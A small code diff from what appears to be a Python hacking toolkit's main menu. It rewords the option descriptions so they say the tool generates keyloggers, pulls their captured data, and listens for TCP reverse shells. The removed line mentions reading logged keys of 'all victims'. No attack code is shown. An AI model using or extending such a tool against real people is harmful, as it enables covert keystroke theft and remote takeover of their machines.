@@ -24,8 +24,8 @@ def execfile_y(file_name, globals_variables):
 
 def print_main_options():
     options = {
-        'keylogger': 'Use this option to generate keyloggers',
-        'backdoor': 'Use this options to read logged keys of all victims'
+        'keylogger': 'You can generate and pull information from keyloggers',
+        'backdoor': 'You can generate and listen to tcp reverse shells'
     }
 
     table_data = [[colors.BOLD + 'Option', colors.BOLD + 'Description' + colors.RESET]]
